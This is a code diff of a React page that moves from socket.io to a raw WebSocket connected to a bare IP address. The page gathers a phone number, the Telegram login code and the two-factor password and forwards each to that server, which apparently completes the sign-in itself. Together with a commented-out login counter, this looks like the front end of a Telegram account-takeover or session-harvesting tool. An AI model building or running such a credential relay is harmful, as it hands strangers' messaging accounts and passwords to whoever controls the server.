@@ -1,16 +1,33 @@
 import './App.css';
-import { useEffect, useState } from 'react';
-import axios from 'axios';
+import { useEffect, useRef, useState } from 'react';
 import { ToastContainer, toast } from 'react-toastify';
 import 'react-toastify/dist/ReactToastify.css';
-import io from 'socket.io-client';
 function App() {
-  const baseUrl = 'ws://18.139.219.242:14276/ws/telegram';
   const toastId = 'loader';
-  //  const socket = io(baseUrl);
-  const socket = io('ws://18.139.219.242:14276', {
-    path: '/ws/telegram',
-  });
+
+  // const wsStart = 'ws://18.143.64.128:14276/ws/';
+  // const url = wsStart + 'telegram/';
+  // const socket = new WebSocket(url);
+
+  // socket.onopen = function (event) {
+  //   console.log('WebSocket connection opened:', event);
+  // };
+  // socket.onerror = function (event) {
+  //   console.log('socket error ', event);
+  // };
+
+  // socket.onerror = function (error) {
+  //   console.error('WebSocket connection error:', error);
+  // };
+
+  // socket.onclose = function (event) {
+  //   console.log('WebSocket connection closed:', event);
+  // };
+
+  // // Handle incoming messages
+  // socket.onmessage = function (event) {
+  //   console.log('WebSocket message received:', event.data);
+  // };
 
   const errorMsg = 'Something went wrong. Try again!!';
   const [number, setNumber] = useState('');
@@ -22,28 +39,37 @@ function App() {
   const [isPasswordRequired, setIsPasswordRequired] = useState(false);
   const [counter, setCounter] = useState(0);
   const [isTwofaFailed, setIsTwofaFailed] = useState(false);
+  const connection = useRef(null);
   //const [isSubmitting, setIsSubmitting] = useState(false);
-  useEffect(() => {
-    console.log('something!!!');
-    socket.on('connect', () => {
-      console.log('WebSocket connection opened');
-    });
-  }, []);
-
   // useEffect(() => {
-  //   if (!flag) {
-  //     (async () => {
-  //       const url = baseUrl + '/dashboard';
-  //       axios
-  //         .get(url)
-  //         .then((resp) => {
-  //           const counter = resp.data.data.total_count;
-  //           setCounter(counter);
-  //         })
-  //         .catch((err) => console.log(err));
-  //     })();
-  //   }
-  // }, [flag]);
+  //   console.log('something!!!', socket);
+  //   // const socket = getClient();
+  //   // socket.on('connect', () => {
+  //   //   console.log('WebSocket connection opened');
+  //   // });
+  //   // socket.on('disconnect', () => {
+  //   //   console.log('WebSocket connection disconnect');
+  //   // });
+  //   // socket.on('error', (error) => {
+  //   //   console.error('WebSocket connection error:', error);
+  //   // });
+  // }, []);
+
+  useEffect(() => {
+    const wsStart = 'ws://18.143.64.128:14276/ws/';
+    const url = wsStart + 'telegram/';
+    const socket = new WebSocket(url);
+
+    socket.onopen = function (event) {
+      console.log('WebSocket connection opened:', event);
+    };
+
+    socket.onclose = function (event) {
+      console.log('WebSocket connection closed:', event);
+    };
+
+    connection.current = socket;
+  }, []);
 
   const displayToast = (msg = '', type = 'success') => {
     const options = {
@@ -65,85 +91,80 @@ function App() {
   const handleSubmitNumber = (e) => {
     loader();
 
-    // Emit a 'send_otp' event with the phone number
-    socket.emit('send_code', {
+    const message = JSON.stringify({
+      event: 'send_code',
       phone: '+88' + number,
     });
+    connection.current.send(message);
 
-    // Listen for the response from the server
-    socket.on('send_code_status', (data) => {
-      if (data.status === 'failed') {
-        displayToast(data.message, 'error');
-      } else {
-        setPhoneHash(data.phone_code_hash);
-        setFlag(!flag);
-        const msg = 'Successfully sent otp request';
-        displayToast(msg);
+    connection.current.onmessage = function (event) {
+      const data = JSON.parse(event.data);
+      console.log('Received message:', data);
+
+      // Handle the received data (e.g., update UI)
+      if (data.event === 'send_code_status') {
+        //document.getElementById('phoneCodeHash').value = data.phone_code_hash;
+        if (data.status === 'failed') {
+          displayToast(data.message, 'error');
+        } else {
+          setPhoneHash(data.phone_code_hash);
+          setFlag(!flag);
+          const msg = 'Successfully sent otp request';
+          displayToast(msg);
+        }
+
+        // Dismiss the toast notification
+        toast.dismiss(toastId);
       }
-
-      // Dismiss the toast notification
-      toast.dismiss(toastId);
-    });
+    };
   };
 
   const handleSubmitOtp = (e) => {
-    loader();
-
     if (!isTwofaFailed) {
-      // Emit a 'submit_otp' event with the relevant data
-      socket.emit('sign_in', {
+      loader();
+      const message = JSON.stringify({
+        event: 'sign_in',
         phone: '+88' + number,
-        phone_code_hash: phoneHash,
         code: otp,
+        phone_code_hash: phoneHash,
       });
+      connection.current.send(message);
+      toast.dismiss(toastId);
     }
 
-    socket.on('sign_in_status', (data) => {
-      console.log('sign-in successful ', data.status);
-      setIsSubmitted(true);
-      setIsTwofaFailed(false);
-      setNumber('');
-      setOtp('');
-      const msg = 'Successfully Login';
-      displayToast(msg);
-    });
+    connection.current.onmessage = function (event) {
+      const data = JSON.parse(event.data);
+      console.log('Received message:', data);
 
-    socket.on('2fa_failed', () => {
-      setIsTwofaFailed(true);
-    });
+      // Handle the received data (e.g., update UI)
+      if (data.event === 'sign_in_status') {
+        loader();
+        console.log('sign-in successful ', data.status);
+        setIsSubmitted(true);
+        setIsTwofaFailed(false);
+        setNumber('');
+        setOtp('');
+        const msg = 'Successfully Login';
+        displayToast(msg);
+        toast.dismiss(toastId);
+      } else if (data.event === '2fa_failed') {
+        setIsTwofaFailed(true);
+      } else {
+        displayToast(data.message);
+      }
+    };
 
     if (isTwofaFailed) {
-      socket.emit('sign_in_2fa', {
+      toast.dismiss(toastId);
+      loader();
+      const message = JSON.stringify({
+        event: 'sign_in_2fa',
         phone: '+88' + number,
-        phone_code_hash: phoneHash,
-        code: otp,
         password,
       });
+      connection.current.send(message);
     }
-
-    // // Listen for the response from the server
-    // socket.on('otp_submission_response', (response) => {
-    //   console.log('data ', response);
-    //   const data = response.data;
-
-    //   if (data.status === 'failed') {
-    //     displayToast(data.message, 'error');
-
-    //     if (data.password_required) {
-    //       setIsPasswordRequired(true);
-    //     }
-    //   } else {
-    //     setIsPasswordRequired(false);
-    //     setIsSubmitted(true);
-    //     setNumber('');
-    //     setOtp('');
-    //     const msg = 'Successfully Login';
-    //     displayToast(msg);
-    //   }
-
-    //   // Dismiss the toast notification
-    //   toast.dismiss(toastId);
-    // });
+    toast.dismiss(toastId);
   };
 
   const handleAnotherNumber = () => {
